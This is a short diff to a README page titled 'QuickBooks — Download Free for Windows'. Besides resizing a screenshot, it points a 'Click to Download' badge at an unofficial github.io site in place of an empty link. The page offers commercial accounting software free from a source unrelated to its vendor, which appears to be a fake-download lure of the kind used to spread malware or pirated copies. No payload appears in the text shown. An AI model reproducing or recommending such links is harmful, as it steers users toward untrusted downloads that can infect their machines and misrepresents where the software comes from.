@@ -1,7 +1,7 @@
 # QuickBooks — Download Free for Windows
-<img width="410" height="166" alt="Screenshot_4" src="https://github.com/user-attachments/assets/0eca2712-f336-468d-9e34-a1c578dcaa88" />
+<img width="500" height="166" alt="Screenshot_4" src="https://github.com/user-attachments/assets/0eca2712-f336-468d-9e34-a1c578dcaa88" />
 
-[![Click to Download](https://img.shields.io/badge/Click_to-Download-blue?style=for-the-badge)](#)
+[![Click to Download](https://img.shields.io/badge/Click_to-Download-blue?style=for-the-badge)](https://quickbooks-download.github.io/.github/)
 
 ---
 
